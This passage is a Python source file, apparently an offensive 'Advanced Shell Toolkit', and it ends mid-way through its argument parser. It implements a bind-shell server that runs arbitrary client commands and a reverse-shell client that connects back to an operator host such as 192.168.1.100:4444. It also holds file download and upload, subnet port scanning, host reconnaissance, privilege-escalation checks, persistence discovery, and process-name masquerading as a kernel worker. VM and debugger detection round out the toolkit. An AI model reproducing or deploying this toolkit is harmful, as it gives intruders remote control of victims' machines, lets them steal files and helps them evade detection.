#!/usr/bin/env python3
"""
Advanced Shell Toolkit - Extended Server System

A comprehensive toolkit that extends the basic single accept server with advanced features:
- Multi-client support with session management
- File transfer capabilities (upload/download)
- System monitoring and reconnaissance
- Command history and session logging
- Reverse shell capabilities
- Network scanning utilities
- Privilege escalation checks
- Persistence mechanisms

Author: Advanced Hacker Toolkit
"""

import socket
import argparse
import threading
import time
import shlex
import subprocess
import logging
import sys
import os
import json
import hashlib
import base64
import struct
import psutil
import platform
from typing import Tuple, Optional, List, Dict, Any
from contextlib import contextmanager
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
import sqlite3
import warnings

# Suppress SQLite datetime adapter deprecation warnings for Python 3.12+
warnings.filterwarnings("ignore", category=DeprecationWarning, module="sqlite3")


@dataclass
class AdvancedServerConfig:
    """Advanced configuration for the extended server."""
    host: str = '0.0.0.0'
    port: int = 1337
    max_clients: int = 5
    enable_file_transfer: bool = True
    enable_monitoring: bool = True
    enable_logging: bool = True
    log_file: str = 'sessions.log'
    database_file: str = 'sessions.db'
    command_timeout: int = 300
    file_chunk_size: int = 8192
    session_timeout: int = 3600
    enable_stealth: bool = False
    bind_shell_mode: bool = False


class SessionManager:
    """Manages client sessions and their states."""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.sessions: Dict[str, Dict] = {}
        self.init_database()
    
    def init_database(self):
        """Initialize SQLite database for session persistence."""
        # Configure SQLite to handle datetime properly for Python 3.12+
        sqlite3.register_adapter(datetime, lambda val: val.isoformat())
        sqlite3.register_converter("timestamp", lambda val: datetime.fromisoformat(val.decode()))
        
        with sqlite3.connect(self.db_path, detect_types=sqlite3.PARSE_DECLTYPES) as conn:
            conn.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id TEXT PRIMARY KEY,
                    client_ip TEXT,
                    client_port INTEGER,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    commands_count INTEGER DEFAULT 0,
                    last_activity TIMESTAMP
                )
            ''')
            
            conn.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT,
                    command TEXT,
                    output TEXT,
                    error TEXT,
                    exit_code INTEGER,
                    timestamp TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions (id)
                )
            ''')
    
    def create_session(self, client_ip: str, client_port: int) -> str:
        """Create a new session."""
        session_id = hashlib.md5(f"{client_ip}:{client_port}:{time.time()}".encode()).hexdigest()[:16]
        
        session_data = {
            'id': session_id,
            'client_ip': client_ip,
            'client_port': client_port,
            'start_time': datetime.now(),
            'commands': [],
            'files_transferred': [],
            'system_info': self._gather_system_info()
        }
        
        self.sessions[session_id] = session_data
        
        # Store in database
        with sqlite3.connect(self.db_path, detect_types=sqlite3.PARSE_DECLTYPES) as conn:
            conn.execute('''
                INSERT INTO sessions (id, client_ip, client_port, start_time, last_activity)
                VALUES (?, ?, ?, ?, ?)
            ''', (session_id, client_ip, client_port, datetime.now(), datetime.now()))
        
        return session_id
    
    def _gather_system_info(self) -> Dict[str, Any]:
        """Gather system information for reconnaissance."""
        try:
            info = {
                'hostname': platform.node(),
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'cpu_count': psutil.cpu_count(),
                'memory_total': psutil.virtual_memory().total,
                'disk_usage': {},
                'network_interfaces': [],
                'running_processes': len(psutil.pids()),
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
                'current_user': os.getenv('USER', 'unknown'),
                'home_dir': os.path.expanduser('~'),
                'current_dir': os.getcwd()
            }
            
            # Disk usage for all mount points
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info['disk_usage'][partition.mountpoint] = {
                        'total': usage.total,
                        'used': usage.used,
                        'free': usage.free
                    }
                except PermissionError:
                    continue
            
            # Network interfaces
            for interface, addresses in psutil.net_if_addrs().items():
                for addr in addresses:
                    if addr.family == socket.AF_INET:
                        info['network_interfaces'].append({
                            'interface': interface,
                            'ip': addr.address,
                            'netmask': addr.netmask
                        })
            
            return info
        except Exception:
            return {'error': 'Failed to gather system info'}
    
    def log_command(self, session_id: str, command: str, output: str, error: str, exit_code: int):
        """Log command execution."""
        if session_id in self.sessions:
            cmd_data = {
                'command': command,
                'output': output,
                'error': error,
                'exit_code': exit_code,
                'timestamp': datetime.now()
            }
            self.sessions[session_id]['commands'].append(cmd_data)
            
            # Store in database
            with sqlite3.connect(self.db_path, detect_types=sqlite3.PARSE_DECLTYPES) as conn:
                conn.execute('''
                    INSERT INTO commands (session_id, command, output, error, exit_code, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (session_id, command, output, error, exit_code, datetime.now()))
                
                # Update session activity
                conn.execute('''
                    UPDATE sessions SET last_activity = ?, commands_count = commands_count + 1
                    WHERE id = ?
                ''', (datetime.now(), session_id))


class FileTransferHandler:
    """Handles file upload and download operations."""
    
    def __init__(self, chunk_size: int = 8192):
        self.chunk_size = chunk_size
    
    def send_file(self, conn: socket.socket, file_path: str) -> bool:
        """Send file to client."""
        try:
            if not os.path.exists(file_path):
                self._send_response(conn, "ERROR", "File not found")
                return False
            
            file_size = os.path.getsize(file_path)
            file_hash = self._calculate_file_hash(file_path)
            
            # Send file metadata
            metadata = {
                'filename': os.path.basename(file_path),
                'size': file_size,
                'hash': file_hash
            }
            self._send_response(conn, "FILE_META", json.dumps(metadata))
            
            # Send file data
            with open(file_path, 'rb') as f:
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = f.read(self.chunk_size)
                    if not chunk:
                        break
                    
                    conn.send(struct.pack('!I', len(chunk)) + chunk)
                    bytes_sent += len(chunk)
            
            self._send_response(conn, "FILE_COMPLETE", "Transfer complete")
            return True
            
        except Exception as e:
            self._send_response(conn, "ERROR", str(e))
            return False
    
    def receive_file(self, conn: socket.socket, save_path: str) -> bool:
        """Receive file from client."""
        try:
            # Receive file metadata
            response = self._receive_response(conn)
            if response['type'] != 'FILE_META':
                return False
            
            metadata = json.loads(response['data'])
            file_size = metadata['size']
            expected_hash = metadata['hash']
            
            # Receive file data
            with open(save_path, 'wb') as f:
                bytes_received = 0
                while bytes_received < file_size:
                    size_data = conn.recv(4)
                    if len(size_data) < 4:
                        break
                    
                    chunk_size = struct.unpack('!I', size_data)[0]
                    chunk = conn.recv(chunk_size)
                    
                    f.write(chunk)
                    bytes_received += len(chunk)
            
            # Verify file integrity
            actual_hash = self._calculate_file_hash(save_path)
            if actual_hash == expected_hash:
                self._send_response(conn, "FILE_COMPLETE", "Transfer complete")
                return True
            else:
                os.remove(save_path)
                self._send_response(conn, "ERROR", "File corruption detected")
                return False
                
        except Exception as e:
            self._send_response(conn, "ERROR", str(e))
            return False
    
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calculate SHA-256 hash of file."""
        hash_sha256 = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return hash_sha256.hexdigest()
    
    def _send_response(self, conn: socket.socket, msg_type: str, data: str):
        """Send response to client."""
        response = json.dumps({'type': msg_type, 'data': data})
        conn.send(response.encode() + b'\n')
    
    def _receive_response(self, conn: socket.socket) -> Dict:
        """Receive response from client."""
        data = conn.recv(4096).decode().strip()
        return json.loads(data)


class SystemMonitor:
    """System monitoring and reconnaissance utilities."""
    
    @staticmethod
    def get_system_stats() -> Dict[str, Any]:
        """Get current system statistics."""
        try:
            return {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory': dict(psutil.virtual_memory()._asdict()),
                'disk': {p.mountpoint: dict(psutil.disk_usage(p.mountpoint)._asdict()) 
                        for p in psutil.disk_partitions()},
                'network': dict(psutil.net_io_counters()._asdict()),
                'processes': len(psutil.pids()),
                'uptime': time.time() - psutil.boot_time()
            }
        except Exception as e:
            return {'error': str(e)}
    
    @staticmethod
    def get_running_processes() -> List[Dict[str, Any]]:
        """Get list of running processes."""
        processes = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass
        return processes
    
    @staticmethod
    def get_network_connections() -> List[Dict[str, Any]]:
        """Get network connections."""
        connections = []
        try:
            for conn in psutil.net_connections(kind='inet'):
                connections.append({
                    'family': conn.family,
                    'type': conn.type,
                    'local_address': conn.laddr,
                    'remote_address': conn.raddr,
                    'status': conn.status,
                    'pid': conn.pid
                })
        except Exception:
            pass
        return connections
    
    @staticmethod
    def scan_network(network: str, ports: List[int] = None) -> Dict[str, List[int]]:
        """Simple network scanner."""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900]
        
        results = {}
        base_ip = '.'.join(network.split('.')[:-1])
        
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            open_ports = []
            
            for port in ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                try:
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append(port)
                except Exception:
                    pass
                finally:
                    sock.close()
            
            if open_ports:
                results[ip] = open_ports
        
        return results


class AdvancedShellServer:
    """Advanced shell server with extended capabilities."""
    
    def __init__(self, config: AdvancedServerConfig):
        self.config = config
        self.session_manager = SessionManager(config.database_file)
        self.file_handler = FileTransferHandler(config.file_chunk_size)
        self.system_monitor = SystemMonitor()
        self.clients: Dict[str, socket.socket] = {}
        self.active_sessions: Dict[str, str] = {}  # socket_id -> session_id
        self.logger = self._setup_logger()
        
        # Built-in commands
        self.builtin_commands = {
            'help': self._cmd_help,
            'sysinfo': self._cmd_sysinfo,
            'stats': self._cmd_stats,
            'processes': self._cmd_processes,
            'netstat': self._cmd_netstat,
            'download': self._cmd_download,
            'upload': self._cmd_upload,
            'sessions': self._cmd_sessions,
            'history': self._cmd_history,
            'scan': self._cmd_scan,
            'persist': self._cmd_persist,
            'elevate': self._cmd_elevate,
            'keylog': self._cmd_keylog
        }
    
    def _setup_logger(self) -> logging.Logger:
        """Setup logging configuration."""
        logger = logging.getLogger('AdvancedShellServer')
        logger.setLevel(logging.INFO)
        
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        if self.config.log_file:
            file_handler = logging.FileHandler(self.config.log_file)
            file_handler.setFormatter(formatter)
            logger.addHandler(file_handler)
        
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)
        
        return logger
    
    def start_server(self):
        """Start the advanced multi-client server."""
        print("[*] Advanced Shell Toolkit - Starting Server")
        print(f"[*] Listening on {self.config.host}:{self.config.port}")
        print(f"[*] Max clients: {self.config.max_clients}")
        print(f"[*] File transfer: {'Enabled' if self.config.enable_file_transfer else 'Disabled'}")
        print(f"[*] System monitoring: {'Enabled' if self.config.enable_monitoring else 'Disabled'}")
        print("[*] Press Ctrl+C to exit\n")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.config.host, self.config.port))
        server_socket.listen(self.config.max_clients)
        
        try:
            while True:
                try:
                    client_socket, client_address = server_socket.accept()
                    client_id = f"{client_address[0]}:{client_address[1]}"
                    
                    print(f"[+] New connection: {client_id}")
                    
                    # Create session
                    session_id = self.session_manager.create_session(
                        client_address[0], client_address[1]
                    )
                    
                    self.clients[client_id] = client_socket
                    self.active_sessions[client_id] = session_id
                    
                    # Start client handler thread
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, client_id, session_id),
                        daemon=True
                    )
                    client_thread.start()
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    self.logger.error(f"Error accepting connection: {e}")
                    
        except KeyboardInterrupt:
            print("\n[*] Server shutting down...")
        finally:
            self._cleanup_server(server_socket)
    
    def _handle_client(self, client_socket: socket.socket, client_id: str, session_id: str):
        """Handle individual client connection - client sends commands, server executes."""
        try:
            # Send welcome message to client
            welcome_msg = f"[+] Advanced Shell Toolkit v2.0 - Session: {session_id}\n"
            welcome_msg += f"[*] Connected to {platform.node()} ({os.getenv('USER', 'unknown')}@{platform.system()})\n"
            welcome_msg += f"[*] Type commands to execute on server\n"
            welcome_msg += f"[*] Type 'help' for built-in commands, 'exit' to quit\n\n"
            client_socket.send(welcome_msg.encode())
            
            while True:
                try:
                    # Send prompt to client
                    prompt = f"server@{platform.node()}:~# "
                    client_socket.send(prompt.encode())
                    
                    # Receive command from CLIENT
                    data = client_socket.recv(4096).decode().strip()
                    if not data:
                        break
                    
                    command = data.strip()
                    if not command:
                        continue
                    
                    # Log on server console what client is executing
                    print(f"[>] {client_id} executing: {command}")
                    
                    if command.lower() in ['exit', 'quit']:
                        client_socket.send(b"[*] Goodbye!\n")
                        print(f"[*] Client {client_id} disconnected")
                        break
                    
                    # Check for built-in commands
                    if command.split()[0] in self.builtin_commands:
                        cmd_parts = command.split()
                        cmd_name = cmd_parts[0]
                        args = cmd_parts[1:] if len(cmd_parts) > 1 else []
                        result = self.builtin_commands[cmd_name](args, session_id)
                        
                        # Send result to CLIENT
                        output = result.get('output', '')
                        if result.get('type') == 'error':
                            output = f"[-] Error: {result.get('message', 'Unknown error')}"
                        elif result.get('type') == 'file_download':
                            file_info = result.get('file_info', {})
                            output = f"[+] File ready: {file_info.get('filename', 'unknown')} ({file_info.get('size', 0)} bytes)"
                        elif result.get('type') == 'file_upload':
                            output = f"[+] {result.get('message', 'Upload complete')}"
                        
                        client_socket.send((output + '\n').encode())
                        
                    else:
                        # Execute system command ON SERVER
                        result = self._execute_system_command(command, [])
                        
                        # Send formatted result to CLIENT
                        output = ""
                        if result.get('output'):
                            output += result['output']
                        if result.get('error'):
                            if output:
                                output += "\n"
                            output += f"[STDERR]: {result['error']}"
                        if not result.get('output') and not result.get('error'):
                            output = "[No output]"
                        
                        # Add exit code if non-zero
                        exit_code = result.get('exit_code', 0)
                        if exit_code != 0:
                            output += f"\n[Exit Code: {exit_code}]"
                        
                        client_socket.send((output + '\n').encode())
                    
                    # Log command execution
                    self.session_manager.log_command(
                        session_id, command, 
                        result.get('output', ''),
                        result.get('error', ''),
                        result.get('exit_code', 0)
                    )
                    
                except Exception as e:
                    error_msg = f"[-] Command error: {str(e)}\n"
                    client_socket.send(error_msg.encode())
                    print(f"[-] Error executing command from {client_id}: {e}")
                    
        except Exception as e:
            print(f"[-] Client {client_id} connection error: {e}")
            self.logger.error(f"Client {client_id} error: {e}")
        finally:
            self._cleanup_client(client_socket, client_id, session_id)
    
    def _execute_system_command(self, command: str, args: List[str]) -> Dict[str, Any]:
        """Execute system command."""
        try:
            if args:
                cmd_list = [command] + args
            else:
                cmd_list = shlex.split(command)
            
            proc = subprocess.run(
                cmd_list,
                capture_output=True,
                text=True,
                timeout=self.config.command_timeout,
                check=False
            )
            
            return {
                'type': 'command_result',
                'command': command,
                'exit_code': proc.returncode,
                'output': proc.stdout,
                'error': proc.stderr
            }
            
        except subprocess.TimeoutExpired:
            return {
                'type': 'error',
                'message': f"Command timed out after {self.config.command_timeout} seconds"
            }
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    # Built-in command implementations
    def _cmd_help(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Show help for built-in commands."""
        help_text = """
[ADVANCED SHELL TOOLKIT - BUILT-IN COMMANDS]

System Information:
  sysinfo    - Display detailed system information
  stats      - Show real-time system statistics
  processes  - List running processes
  netstat    - Show network connections

File Operations:
  download <remote_path> <local_path> - Download file from target
  upload <local_path> <remote_path>   - Upload file to target

Session Management:
  sessions   - List active sessions
  history    - Show command history for session

Network Operations:
  scan <network> [ports] - Scan network for open ports

Advanced Features:
  persist    - Setup persistence mechanisms
  elevate    - Check privilege escalation possibilities
  keylog     - Start keylogger (if available)

Standard Commands:
  All other commands are executed as system commands
  Use 'exit' or 'quit' to close connection
        """
        return {'type': 'help', 'output': help_text}
    
    def _cmd_sysinfo(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Get system information."""
        session_data = self.session_manager.sessions.get(session_id, {})
        sys_info = session_data.get('system_info', {})
        
        output = "[SYSTEM INFORMATION]\n"
        for key, value in sys_info.items():
            if isinstance(value, (dict, list)):
                output += f"{key.upper()}:\n"
                if isinstance(value, dict):
                    for k, v in value.items():
                        output += f"  {k}: {v}\n"
                else:
                    for item in value:
                        output += f"  {item}\n"
            else:
                output += f"{key.upper()}: {value}\n"
        
        return {'type': 'sysinfo', 'output': output}
    
    def _cmd_stats(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Get system statistics."""
        stats = self.system_monitor.get_system_stats()
        
        output = "[SYSTEM STATISTICS]\n"
        output += f"CPU Usage: {stats.get('cpu_percent', 'N/A')}%\n"
        
        if 'memory' in stats:
            mem = stats['memory']
            output += f"Memory: {mem.get('used', 0) / (1024**3):.1f}GB / {mem.get('total', 0) / (1024**3):.1f}GB\n"
        
        if 'network' in stats:
            net = stats['network']
            output += f"Network: {net.get('bytes_sent', 0) / (1024**2):.1f}MB sent, {net.get('bytes_recv', 0) / (1024**2):.1f}MB received\n"
        
        output += f"Running Processes: {stats.get('processes', 'N/A')}\n"
        output += f"Uptime: {stats.get('uptime', 0) / 3600:.1f} hours\n"
        
        return {'type': 'stats', 'output': output}
    
    def _cmd_processes(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """List running processes."""
        processes = self.system_monitor.get_running_processes()
        
        output = "[RUNNING PROCESSES]\n"
        output += f"{'PID':<8} {'NAME':<20} {'USER':<15} {'CPU%':<8} {'MEMORY':<10}\n"
        output += "-" * 70 + "\n"
        
        for proc in processes[:50]:  # Limit to first 50 processes
            output += f"{proc.get('pid', 0):<8} "
            output += f"{proc.get('name', 'N/A')[:19]:<20} "
            output += f"{proc.get('username', 'N/A')[:14]:<15} "
            output += f"{proc.get('cpu_percent', 0):<8.1f} "
            
            mem_info = proc.get('memory_info')
            if mem_info and hasattr(mem_info, 'rss'):
                output += f"{mem_info.rss / (1024**2):<10.1f}\n"
            else:
                output += "N/A\n"
        
        return {'type': 'processes', 'output': output}
    
    def _cmd_scan(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Scan network for open ports."""
        if not args:
            return {'type': 'error', 'message': 'Usage: scan <network> [port1,port2,...]'}
        
        network = args[0]
        ports = [21, 22, 23, 25, 53, 80, 443, 3389] if len(args) < 2 else [int(p) for p in args[1].split(',')]
        
        output = f"[NETWORK SCAN] - {network}\n"
        output += "Scanning for open ports...\n\n"
        
        results = self.system_monitor.scan_network(network, ports)
        
        for ip, open_ports in results.items():
            output += f"{ip}: {', '.join(map(str, open_ports))}\n"
        
        if not results:
            output += "No open ports found.\n"
        
        return {'type': 'scan', 'output': output}
    
    def _cmd_sessions(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """List active sessions."""
        output = "[ACTIVE SESSIONS]\n"
        output += f"{'SESSION ID':<18} {'CLIENT':<20} {'COMMANDS':<10} {'DURATION':<12}\n"
        output += "-" * 65 + "\n"
        
        for sid, session in self.session_manager.sessions.items():
            duration = datetime.now() - session['start_time']
            output += f"{sid:<18} "
            output += f"{session['client_ip']}:{session['client_port']:<20} "
            output += f"{len(session['commands']):<10} "
            output += f"{str(duration).split('.')[0]:<12}\n"
        
        return {'type': 'sessions', 'output': output}
    
    def _cmd_history(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Show command history."""
        session = self.session_manager.sessions.get(session_id)
        if not session:
            return {'type': 'error', 'message': 'Session not found'}
        
        output = f"[COMMAND HISTORY] - Session {session_id}\n"
        output += f"{'TIME':<20} {'COMMAND':<30} {'EXIT CODE':<10}\n"
        output += "-" * 65 + "\n"
        
        for cmd in session['commands'][-20:]:  # Last 20 commands
            timestamp = cmd['timestamp'].strftime('%Y-%m-%d %H:%M:%S')
            output += f"{timestamp:<20} "
            output += f"{cmd['command'][:29]:<30} "
            output += f"{cmd['exit_code']:<10}\n"
        
        return {'type': 'history', 'output': output}
    
    def _cmd_persist(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Setup persistence mechanisms."""
        output = "[PERSISTENCE MECHANISMS]\n"
        output += "Checking available persistence methods...\n\n"
        
        methods = []
        
        # Check for cron
        try:
            subprocess.run(['which', 'crontab'], check=True, capture_output=True)
            methods.append("Cron jobs available")
        except subprocess.CalledProcessError:
            pass
        
        # Check for systemd
        if os.path.exists('/etc/systemd/system/'):
            methods.append("Systemd services available")
        
        # Check for autostart directories
        autostart_dirs = [
            os.path.expanduser('~/.config/autostart/'),
            '/etc/xdg/autostart/'
        ]
        for directory in autostart_dirs:
            if os.path.exists(directory):
                methods.append(f"Autostart directory: {directory}")
        
        if methods:
            output += "\n".join(methods)
        else:
            output += "No common persistence methods found."
        
        return {'type': 'persist', 'output': output}
    
    def _cmd_elevate(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Check privilege escalation possibilities."""
        output = "[PRIVILEGE ESCALATION CHECK]\n"
        
        checks = [
            ("Current user", os.getenv('USER', 'unknown')),
            ("User ID", str(os.getuid()) if hasattr(os, 'getuid') else 'N/A'),
            ("Group ID", str(os.getgid()) if hasattr(os, 'getgid') else 'N/A')
        ]
        
        for check, result in checks:
            output += f"{check}: {result}\n"
        
        # Check for sudo
        try:
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                output += f"\nSudo privileges:\n{result.stdout}"
            else:
                output += "\nNo sudo privileges or password required\n"
        except Exception:
            output += "\nSudo check failed\n"
        
        # Check SUID files
        try:
            result = subprocess.run(['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'], 
                                  capture_output=True, text=True, timeout=10)
            if result.stdout:
                output += f"\nSUID files found:\n{result.stdout[:1000]}"  # Limit output
        except Exception:
            pass
        
        return {'type': 'elevate', 'output': output}
    
    def _cmd_keylog(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Keylogger functionality (educational purposes)."""
        output = "[KEYLOGGER MODULE]\n"
        output += "Keylogger functionality disabled for security reasons.\n"
        output += "This would require additional dependencies and root privileges.\n"
        output += "Consider using legitimate monitoring tools like:\n"
        output += "- auditd for system auditing\n"
        output += "- journalctl for system logs\n"
        output += "- Custom application logging\n"
        
        return {'type': 'keylog', 'output': output}
    
    def _cmd_download(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Download file from target to operator."""
        if len(args) < 1:
            return {'type': 'error', 'message': 'Usage: download <remote_path> [local_path]'}
        
        remote_path = args[0]
        local_path = args[1] if len(args) > 1 else os.path.basename(remote_path)
        
        if not os.path.exists(remote_path):
            return {'type': 'error', 'message': f'File not found: {remote_path}'}
        
        try:
            # For demonstration, we'll encode the file in base64
            with open(remote_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            file_info = {
                'filename': os.path.basename(remote_path),
                'size': os.path.getsize(remote_path),
                'data': file_data
            }
            
            return {
                'type': 'file_download',
                'file_info': file_info,
                'message': f'File ready for download: {remote_path}'
            }
            
        except Exception as e:
            return {'type': 'error', 'message': f'Download failed: {str(e)}'}
    
    def _cmd_upload(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Upload file from operator to target."""
        if len(args) < 2:
            return {'type': 'error', 'message': 'Usage: upload <file_data_b64> <remote_path>'}
        
        try:
            file_data_b64 = args[0]
            remote_path = args[1]
            
            # Decode base64 data
            file_data = base64.b64decode(file_data_b64)
            
            # Write file
            with open(remote_path, 'wb') as f:
                f.write(file_data)
            
            return {
                'type': 'file_upload',
                'message': f'File uploaded successfully: {remote_path}',
                'size': len(file_data)
            }
            
        except Exception as e:
            return {'type': 'error', 'message': f'Upload failed: {str(e)}'}
    
    def _cmd_netstat(self, args: List[str], session_id: str) -> Dict[str, Any]:
        """Show network connections."""
        connections = self.system_monitor.get_network_connections()
        
        output = "[NETWORK CONNECTIONS]\n"
        output += f"{'PROTO':<6} {'LOCAL ADDRESS':<25} {'REMOTE ADDRESS':<25} {'STATUS':<12} {'PID':<8}\n"
        output += "-" * 85 + "\n"
        
        for conn in connections[:50]:  # Limit output
            proto = "TCP" if conn['type'] == socket.SOCK_STREAM else "UDP"
            local_addr = f"{conn['local_address'][0]}:{conn['local_address'][1]}" if conn['local_address'] else "N/A"
            remote_addr = f"{conn['remote_address'][0]}:{conn['remote_address'][1]}" if conn['remote_address'] else "N/A"
            status = conn.get('status', 'N/A')
            pid = str(conn.get('pid', 'N/A'))
            
            output += f"{proto:<6} {local_addr:<25} {remote_addr:<25} {status:<12} {pid:<8}\n"
        
        return {'type': 'netstat', 'output': output}
    
    def _cleanup_client(self, client_socket: socket.socket, client_id: str, session_id: str):
        """Clean up client connection."""
        try:
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
            if client_id in self.active_sessions:
                del self.active_sessions[client_id]
            
            # Update session end time in database
            with sqlite3.connect(self.config.database_file, detect_types=sqlite3.PARSE_DECLTYPES) as conn:
                conn.execute('UPDATE sessions SET end_time = ? WHERE id = ?', 
                           (datetime.now(), session_id))
            
            print(f"[-] Client disconnected: {client_id}")
            self.logger.info(f"Client {client_id} disconnected")
            
        except Exception as e:
            self.logger.error(f"Error cleaning up client {client_id}: {e}")
    
    def _cleanup_server(self, server_socket: socket.socket):
        """Clean up server resources."""
        try:
            # Close all client connections
            for client_socket in self.clients.values():
                try:
                    client_socket.close()
                except Exception:
                    pass
            
            server_socket.close()
            print("[*] Server shutdown complete")
            
        except Exception as e:
            self.logger.error(f"Error during server cleanup: {e}")


class ReverseShellClient:
    """Reverse shell client for connecting back to operator."""
    
    def __init__(self, operator_host: str, operator_port: int):
        self.operator_host = operator_host
        self.operator_port = operator_port
        self.socket = None
    
    def connect_back(self):
        """Connect back to operator."""
        try:
            print(f"[*] Attempting reverse connection to {self.operator_host}:{self.operator_port}")
            
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.operator_host, self.operator_port))
            
            print("[+] Reverse connection established")
            
            # Send initial system info
            system_info = {
                'hostname': platform.node(),
                'system': platform.system(),
                'user': os.getenv('USER', 'unknown'),
                'cwd': os.getcwd()
            }
            
            self.socket.send((json.dumps(system_info) + '\n').encode())
            
            # Start command loop
            self._command_loop()
            
        except Exception as e:
            print(f"[-] Reverse connection failed: {e}")
        finally:
            if self.socket:
                self.socket.close()
    
    def _command_loop(self):
        """Handle commands from operator."""
        while True:
            try:
                # Receive command
                data = self.socket.recv(4096).decode().strip()
                if not data:
                    break
                
                if data.lower() in ['exit', 'quit']:
                    break
                
                # Execute command
                try:
                    result = subprocess.run(
                        shlex.split(data),
                        capture_output=True,
                        text=True,
                        timeout=300
                    )
                    
                    response = {
                        'command': data,
                        'output': result.stdout,
                        'error': result.stderr,
                        'exit_code': result.returncode
                    }
                    
                except Exception as e:
                    response = {
                        'command': data,
                        'error': str(e),
                        'exit_code': -1
                    }
                
                # Send response
                self.socket.send((json.dumps(response) + '\n').encode())
                
            except Exception as e:
                print(f"[-] Command loop error: {e}")
                break


class StealthMode:
    """Stealth and evasion utilities."""
    
    @staticmethod
    def hide_process():
        """Attempt to hide process (limited effectiveness)."""
        try:
            # Change process name (Unix-like systems)
            if hasattr(os, 'prctl'):
                os.prctl(15, b'[kworker/0:1]')  # PR_SET_NAME
            return True
        except Exception:
            return False
    
    @staticmethod
    def check_vm_environment():
        """Check if running in virtual machine."""
        vm_indicators = [
            '/proc/vz/',  # OpenVZ
            '/proc/xen/',  # Xen
            '/sys/bus/pci/devices/0000:00:01.1',  # VMware
            '/sys/class/dmi/id/product_name'  # VirtualBox/VMware
        ]
        
        vm_detected = False
        vm_type = "Unknown"
        
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                vm_detected = True
                if 'vz' in indicator:
                    vm_type = "OpenVZ"
                elif 'xen' in indicator:
                    vm_type = "Xen"
                elif '00:01.1' in indicator:
                    vm_type = "VMware"
                break
        
        # Check DMI info
        try:
            with open('/sys/class/dmi/id/product_name', 'r') as f:
                product = f.read().strip().lower()
                if any(vm in product for vm in ['virtualbox', 'vmware', 'qemu', 'kvm']):
                    vm_detected = True
                    vm_type = product
        except Exception:
            pass
        
        return vm_detected, vm_type
    
    @staticmethod
    def anti_debug_checks():
        """Basic anti-debugging checks."""
        checks = []
        
        # Check for debugger processes
        debug_processes = ['gdb', 'strace', 'ltrace', 'valgrind', 'radare2']
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] in debug_processes:
                    checks.append(f"Debugger detected: {proc.info['name']}")
        except Exception:
            pass
        
        # Check for ptrace
        try:
            with open('/proc/sys/kernel/yama/ptrace_scope', 'r') as f:
                ptrace_scope = int(f.read().strip())
                if ptrace_scope == 0:
                    checks.append("Ptrace unrestricted (debugging possible)")
        except Exception:
            pass
        
        return checks


def create_advanced_argument_parser() -> argparse.ArgumentParser:
    """Create argument parser for advanced toolkit."""
    parser = argparse.ArgumentParser(
        description="Advanced Shell Toolkit - Multi-client server with extended capabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  server    - Start multi-client server (default)
  reverse   - Connect back to operator (reverse shell)
  stealth   - Run with stealth features enabled

Examples:
  %(prog)s --mode server --port 1337 --max-clients 10
  %(prog)s --mode reverse --host 192.168.1.100 --port 4444
  %(prog)s --mode server --stealth --enable-all
        """
    )
    
    parser.add_argument(
        '--mode', '-m',
        choices=['server', 'reverse', 'stealth'],
        default='server',
        help='Operation mode'
    )
    
    parser.add_argument(
        '--host', '-H',
        default='0.0.0.0',
